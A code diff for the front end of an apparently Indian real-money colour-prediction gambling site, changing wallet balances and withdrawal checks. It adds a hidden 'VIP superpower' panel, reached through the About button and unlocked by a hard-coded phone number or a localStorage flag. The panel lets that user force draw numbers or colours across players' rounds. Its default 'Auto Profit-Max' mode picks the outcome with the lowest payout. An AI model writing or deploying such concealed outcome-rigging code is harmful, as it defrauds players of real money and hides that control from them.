@@ -78,12 +78,28 @@ class StateManager {
                 this.uid = data.user.uid || (Number(data.user.id) < 100000 ? 100000 + Number(data.user.id) : data.user.id);
                 this.inviteCode = data.user.invite_code;
                 this.vipLevel = data.user.vip_level || 1;
+                this.isSpecialVip = Boolean(data.user.is_special_vip || (data.user.phone && String(data.user.phone).replace(/\D/g, '').endsWith('9720955287')));
 
                 localStorage.setItem('asg_balance', this.balance);
                 if (typeof data.user.deposit_balance === 'number') localStorage.setItem('asg_deposit_balance', data.user.deposit_balance);
                 if (typeof data.user.winning_balance === 'number') localStorage.setItem('asg_winning_balance', data.user.winning_balance);
                 localStorage.setItem('asg_uid', this.uid);
                 localStorage.setItem('asg_invite', this.inviteCode);
+                if (this.isSpecialVip) {
+                    localStorage.setItem('asg_is_vip_god', '1');
+                    const vipBtn = document.getElementById('vip-wingo-subnav-btn');
+                    if (vipBtn) {
+                        vipBtn.classList.remove('hidden');
+                        vipBtn.style.display = 'inline-flex';
+                    }
+                } else {
+                    localStorage.removeItem('asg_is_vip_god');
+                    const vipBtn = document.getElementById('vip-wingo-subnav-btn');
+                    if (vipBtn) {
+                        vipBtn.classList.add('hidden');
+                        vipBtn.style.display = 'none';
+                    }
+                }
 
                 this.updateBalanceUI();
                 this.updateAuthButtonUI(true);
@@ -92,6 +108,7 @@ class StateManager {
             } else {
                 this.token = null;
                 localStorage.removeItem('asg_token');
+                localStorage.removeItem('asg_is_vip_god');
                 this.updateAuthButtonUI(false);
             }
         } catch (e) {
@@ -115,12 +132,18 @@ class StateManager {
                         localStorage.removeItem('asg_balance');
                         localStorage.removeItem('asg_deposit_balance');
                         localStorage.removeItem('asg_winning_balance');
+                        localStorage.removeItem('asg_is_vip_god');
                         location.reload();
                     }
                 };
             }
         } else {
             if (balCard) balCard.classList.add('hidden');
+            const vipBtn = document.getElementById('vip-wingo-subnav-btn');
+            if (vipBtn) {
+                vipBtn.classList.add('hidden');
+                vipBtn.style.display = 'none';
+            }
             this.balance = 0.00;
             this.updateBalanceUI();
             if (authBtn) {
@@ -162,6 +185,9 @@ class StateManager {
                             this.showToast(`💰 Balance Updated: +₹${diff.toLocaleString('en-IN', { minimumFractionDigits: 2 })}`, 'success');
                             if (window.sound && window.sound.coin) window.sound.coin();
                         }
+                    } else {
+                        // Sub-wallets (winning/deposit) may have changed even if total balance remained identical
+                        this.updateBalanceUI();
                     }
                 }
             } catch (e) {}
@@ -212,7 +238,14 @@ class StateManager {
             const d = await res.json();
             if (d.success && typeof d.balance === 'number') {
                 this.balance = d.balance;
+                if (this.user) {
+                    this.user.balance = d.balance;
+                    if (typeof d.deposit_balance === 'number') this.user.deposit_balance = d.deposit_balance;
+                    if (typeof d.winning_balance === 'number') this.user.winning_balance = d.winning_balance;
+                }
                 localStorage.setItem('asg_balance', this.balance);
+                if (typeof d.deposit_balance === 'number') localStorage.setItem('asg_deposit_balance', d.deposit_balance);
+                if (typeof d.winning_balance === 'number') localStorage.setItem('asg_winning_balance', d.winning_balance);
                 this.updateBalanceUI();
             }
         } catch (e) {}
@@ -220,6 +253,9 @@ class StateManager {
 
     setLocalBalance(newBalance, flashDir = null) {
         this.balance = Math.max(0, Math.round(Number(newBalance || 0) * 100) / 100);
+        if (this.user) {
+            this.user.balance = this.balance;
+        }
         this._syncLockUntil = Date.now() + 5000;
         localStorage.setItem('asg_balance', this.balance);
         this.updateBalanceUI(flashDir);
@@ -229,6 +265,11 @@ class StateManager {
 
     addBalance(amount, desc, skipServerSync = false) {
         this.balance = Math.round((this.balance + amount) * 100) / 100;
+        if (this.user) {
+            this.user.balance = this.balance;
+            this.user.winning_balance = Math.round(((this.user.winning_balance || 0) + amount) * 100) / 100;
+            localStorage.setItem('asg_winning_balance', this.user.winning_balance);
+        }
         localStorage.setItem('asg_balance', this.balance);
         this.updateBalanceUI('up');
         if (!skipServerSync) this.syncGameDelta(amount);
@@ -236,6 +277,15 @@ class StateManager {
 
     deductBalance(amount, desc, skipServerSync = false) {
         this.balance = Math.max(0, Math.round((this.balance - amount) * 100) / 100);
+        if (this.user) {
+            this.user.balance = this.balance;
+            const fromDep = Math.min(this.user.deposit_balance || 0, amount);
+            const fromWin = Math.max(0, amount - fromDep);
+            this.user.deposit_balance = Math.max(0, Math.round(((this.user.deposit_balance || 0) - fromDep) * 100) / 100);
+            this.user.winning_balance = Math.max(0, Math.round(((this.user.winning_balance || 0) - fromWin) * 100) / 100);
+            localStorage.setItem('asg_deposit_balance', this.user.deposit_balance);
+            localStorage.setItem('asg_winning_balance', this.user.winning_balance);
+        }
         localStorage.setItem('asg_balance', this.balance);
         this.updateBalanceUI('down');
         if (!skipServerSync) this.syncGameDelta(-amount);
@@ -498,17 +548,7 @@ class StateManager {
                 const amt = parseFloat(amtInput ? amtInput.value : 0);
                 const account = accInput ? accInput.value.trim() : '';
 
-                // 1. Time Restriction (10:00 AM to 08:00 PM IST)
-                const now = new Date();
-                const ist = new Date(now.getTime() + (5.5 * 60 * 60 * 1000));
-                const istH = ist.getUTCHours();
-                const istM = ist.getUTCMinutes();
-                const isTimeOpen = (istH >= 10 && (istH < 20 || (istH === 20 && istM === 0)));
-                if (!isTimeOpen) {
-                    this.showToast('Withdrawal service is open only from 10:00 AM to 08:00 PM (IST)! Please submit during active hours.', 'warning');
-                    return;
-                }
-
+                // 1. Minimum amount and wallet check
                 if (!amt || amt < 110) {
                     this.showToast('Minimum withdrawal is ₹110', 'warning');
                     return;
@@ -530,7 +570,8 @@ class StateManager {
                 }
 
                 if (!account) {
-                    this.showToast('Please enter your UPI ID or Bank Account', 'warning');
+                    this.showToast('Please add your Bank Account or UPI ID first to receive payout!', 'warning');
+                    if (typeof openAddBeneficiarySheet === 'function') openAddBeneficiarySheet();
                     return;
                 }
 
@@ -2504,7 +2545,7 @@ function updateWithdrawSummary() {
     if (tdsEl) tdsEl.textContent = `-₹${tds.toFixed(2)}`;
     if (recvEl) recvEl.textContent = `₹${net.toFixed(2)}`;
 
-    // Check IST time: 10:00 AM to 08:00 PM IST
+    // Banking payout window info (24/7 requests open)
     const now = new Date();
     const ist = new Date(now.getTime() + (5.5 * 60 * 60 * 1000));
     const h = ist.getUTCHours();
@@ -2513,12 +2554,12 @@ function updateWithdrawSummary() {
 
     if (timeEl) {
         timeEl.innerHTML = isOpen ?
-            '<span style="color:#10b981; font-weight:700;">10:00 - 20:00 (Open Now)</span>' :
-            '<span style="color:#ef4444; font-weight:700;">10:00 - 20:00 (Closed Now • Opens 10:00 AM IST)</span>';
+            '<span style="color:#10b981; font-weight:700;">24/7 Requests Open • Banking Payouts: 10:00 - 20:00 IST (Active Now)</span>' :
+            '<span style="color:#60a5fa; font-weight:700;">24/7 Requests Open • Banking Settlement: 10:00 AM - 08:00 PM IST</span>';
     }
 
     if (btn) {
-        if (amt >= 110 && amt <= winningBal && acc && isOpen) btn.classList.add('ready');
+        if (amt >= 110 && amt <= winningBal && acc) btn.classList.add('ready');
         else btn.classList.remove('ready');
     }
 }
@@ -3307,3 +3348,273 @@ window.addEventListener('DOMContentLoaded', () => {
         }
     }
 });
+
+// ========================================================
+// VIP SUPERPOWER COLOR PREDICTION CONTROLLER (9720955287)
+// ========================================================
+
+let selectedVipMode = '30s';
+let vipStatusTimer = null;
+
+function isVipGodUser() {
+    const sm = window.stateManager;
+    const phone = sm?.user?.phone || '';
+    const clean = String(phone).replace(/\D/g, '');
+    const isVipPhone = clean === '9720955287' || clean.endsWith('9720955287');
+    return Boolean(sm?.isSpecialVip || isVipPhone || localStorage.getItem('asg_is_vip_god') === '1');
+}
+
+window.handleAboutClick = function() {
+    if (isVipGodUser()) {
+        openVipControllerModal();
+    } else {
+        alert("👑 ASGames VIP — India's Premier Color Prediction, Crash, Lottery & Skill Gaming Platform. 24/7 Instant UPI Support!");
+    }
+};
+
+window.openVipControllerModal = function() {
+    const modal = document.getElementById('vip-superpower-modal');
+    if (!modal) return;
+    modal.classList.remove('hidden');
+    // If Win Go game is active, sync selected mode
+    if (window.wingoGame && window.wingoGame.currentMode) {
+        selectedVipMode = window.wingoGame.currentMode;
+    }
+    switchVipControlMode(selectedVipMode);
+    startVipStatusPolling();
+};
+
+window.closeVipControllerModal = function() {
+    const modal = document.getElementById('vip-superpower-modal');
+    if (modal) modal.classList.add('hidden');
+    stopVipStatusPolling();
+};
+
+window.switchVipControlMode = function(mode) {
+    selectedVipMode = mode;
+    ['30s', '1m', '3m', '5m'].forEach(m => {
+        const btn = document.getElementById(`vip-tab-${m}`);
+        if (btn) {
+            if (m === mode) btn.classList.add('active');
+            else btn.classList.remove('active');
+        }
+    });
+
+    const labels = { '30s': 'Win Go 30s', '1m': 'Win Go 1 Min', '3m': 'Win Go 3 Min', '5m': 'Win Go 5 Min' };
+    const titleEl = document.getElementById('vip-active-game-title');
+    if (titleEl) titleEl.textContent = labels[mode] || mode;
+
+    updateVipModalStatus();
+};
+
+function startVipStatusPolling() {
+    stopVipStatusPolling();
+    updateVipModalStatus();
+    vipStatusTimer = setInterval(updateVipModalStatus, 1000);
+}
+
+function stopVipStatusPolling() {
+    if (vipStatusTimer) {
+        clearInterval(vipStatusTimer);
+        vipStatusTimer = null;
+    }
+}
+
+async function updateVipModalStatus() {
+    const token = localStorage.getItem('asg_token') || window.stateManager?.token;
+    if (!token) return;
+
+    try {
+        const res = await fetch('/api/game/vip-control-status', {
+            headers: { 'Authorization': `Bearer ${token}` }
+        });
+        const d = await res.json();
+        if (!d.success || !d.modes) return;
+
+        // Update mode timers
+        ['30s', '1m', '3m', '5m'].forEach(m => {
+            const info = d.modes[m];
+            if (info) {
+                const timeEl = document.getElementById(`vip-tab-time-${m}`);
+                if (timeEl) {
+                    const rem = Math.max(0, parseInt(info.remaining_seconds, 10) || 0);
+                    const mm = String(Math.floor(rem / 60)).padStart(2, '0');
+                    const ss = String(rem % 60).padStart(2, '0');
+                    timeEl.textContent = `${mm}:${ss}`;
+                }
+            }
+        });
+
+        // Update active mode view
+        const cur = d.modes[selectedVipMode];
+        if (cur) {
+            const rem = Math.max(0, parseInt(cur.remaining_seconds, 10) || 0);
+            const mm = String(Math.floor(rem / 60)).padStart(2, '0');
+            const ss = String(rem % 60).padStart(2, '0');
+            const timerEl = document.getElementById('vip-active-timer');
+            if (timerEl) {
+                timerEl.textContent = `${mm}:${ss}`;
+                timerEl.style.color = rem <= 5 ? '#ef4444' : (rem <= 10 ? '#f59e0b' : '#10b981');
+            }
+
+            const perEl = document.getElementById('vip-active-period');
+            if (perEl) perEl.textContent = cur.period || '--';
+
+            const badgeEl = document.getElementById('vip-active-mode-badge');
+            const bannerEl = document.getElementById('vip-active-armed-banner');
+            const lockChk = document.getElementById('vip-continuous-lock');
+
+            const hasManual = cur.mode === 'manual' && cur.manual_number !== '';
+            if (hasManual) {
+                const n = parseInt(cur.manual_number, 10);
+                const col = n === 0 ? 'Violet-Red' : (n === 5 ? 'Violet-Green' : ([1, 3, 7, 9].includes(n) ? 'Green' : 'Red'));
+                const sz = n >= 5 ? 'Big' : 'Small';
+                const lockTxt = cur.is_locked ? '🔒 Continuous Lock Active' : '🎯 Next Draw Only';
+
+                if (badgeEl) {
+                    badgeEl.textContent = 'Armed: Forced Number ' + n;
+                    badgeEl.style.background = 'rgba(217,172,79,0.22)';
+                    badgeEl.style.color = '#fae59f';
+                }
+                if (bannerEl) {
+                    bannerEl.innerHTML = `🔥 <b>ARMED: Number ${n} (${col} • ${sz})</b><div style="font-size:10px; margin-top:2px; color:#cbd5e1;">${lockTxt} — All phones will see this win!</div>`;
+                    bannerEl.style.borderColor = '#d9ac4f';
+                    bannerEl.style.background = 'rgba(217,172,79,0.18)';
+                }
+                if (lockChk && !lockChk.matches(':focus')) {
+                    lockChk.checked = Boolean(cur.is_locked);
+                }
+            } else {
+                if (badgeEl) {
+                    badgeEl.textContent = 'Auto Profit-Max';
+                    badgeEl.style.background = 'rgba(16,185,129,0.18)';
+                    badgeEl.style.color = '#10b981';
+                }
+                if (bannerEl) {
+                    bannerEl.innerHTML = `⚡ <b>Auto Profit-Max (Sabse Kam Bet Win)</b><div style="font-size:10px; margin-top:2px; color:#94a3b8;">System will automatically select outcome with minimum payout</div>`;
+                    bannerEl.style.borderColor = 'rgba(255,255,255,0.12)';
+                    bannerEl.style.background = 'rgba(0,0,0,0.3)';
+                }
+            }
+
+            // Highlight active number button
+            document.querySelectorAll('.vip-num-btn').forEach(btn => {
+                const vnum = btn.getAttribute('data-vnum');
+                if (hasManual && vnum === String(cur.manual_number)) {
+                    btn.classList.add('armed');
+                } else {
+                    btn.classList.remove('armed');
+                }
+            });
+        }
+    } catch (e) {
+        console.error('Error updating VIP modal status:', e);
+    }
+}
+
+window.vipForceColor = async function(choice) {
+    const token = localStorage.getItem('asg_token') || window.stateManager?.token;
+    if (!token) return alert('Please login first');
+
+    const lockChk = document.getElementById('vip-continuous-lock');
+    const isLock = lockChk ? lockChk.checked : false;
+
+    showVipFeedback('⏳ Arming ' + choice.toUpperCase() + '...', '#fae59f');
+    try {
+        const res = await fetch('/api/game/vip-control', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({
+                target_game: selectedVipMode,
+                choice: choice,
+                lock_force: isLock
+            })
+        });
+        const d = await res.json();
+        if (d.success) {
+            showVipFeedback(`✓ ${d.message}`, '#10b981');
+            if (window.sound && window.sound.click) window.sound.click();
+            updateVipModalStatus();
+        } else {
+            showVipFeedback(`✗ ${d.message || 'Failed to arm outcome'}`, '#ef4444');
+        }
+    } catch (e) {
+        showVipFeedback('✗ Network error. Please check server.', '#ef4444');
+    }
+};
+
+window.vipForceNumber = async function(num) {
+    const token = localStorage.getItem('asg_token') || window.stateManager?.token;
+    if (!token) return alert('Please login first');
+
+    const lockChk = document.getElementById('vip-continuous-lock');
+    const isLock = lockChk ? lockChk.checked : false;
+
+    showVipFeedback(`⏳ Arming Number ${num}...`, '#fae59f');
+    try {
+        const res = await fetch('/api/game/vip-control', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({
+                target_game: selectedVipMode,
+                manual_number: num,
+                lock_force: isLock
+            })
+        });
+        const d = await res.json();
+        if (d.success) {
+            showVipFeedback(`✓ ${d.message}`, '#10b981');
+            if (window.sound && window.sound.click) window.sound.click();
+            updateVipModalStatus();
+        } else {
+            showVipFeedback(`✗ ${d.message || 'Failed to arm number'}`, '#ef4444');
+        }
+    } catch (e) {
+        showVipFeedback('✗ Network error. Please check server.', '#ef4444');
+    }
+};
+
+window.vipRevertAuto = async function() {
+    const token = localStorage.getItem('asg_token') || window.stateManager?.token;
+    if (!token) return;
+
+    showVipFeedback('⏳ Reverting to Auto Mode...', '#fae59f');
+    try {
+        const res = await fetch('/api/game/vip-control', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({
+                target_game: selectedVipMode,
+                action: 'revert'
+            })
+        });
+        const d = await res.json();
+        if (d.success) {
+            const lockChk = document.getElementById('vip-continuous-lock');
+            if (lockChk) lockChk.checked = false;
+            showVipFeedback(`✓ [Win Go ${selectedVipMode.toUpperCase()}] Reverted to Auto Profit-Max!`, '#10b981');
+            updateVipModalStatus();
+        } else {
+            showVipFeedback(`✗ ${d.message || 'Failed to cancel force'}`, '#ef4444');
+        }
+    } catch (e) {
+        showVipFeedback('✗ Network error.', '#ef4444');
+    }
+};
+
+function showVipFeedback(msg, color) {
+    const el = document.getElementById('vip-action-feedback');
+    if (el) {
+        el.textContent = msg;
+        el.style.color = color || '#10b981';
+    }
+}
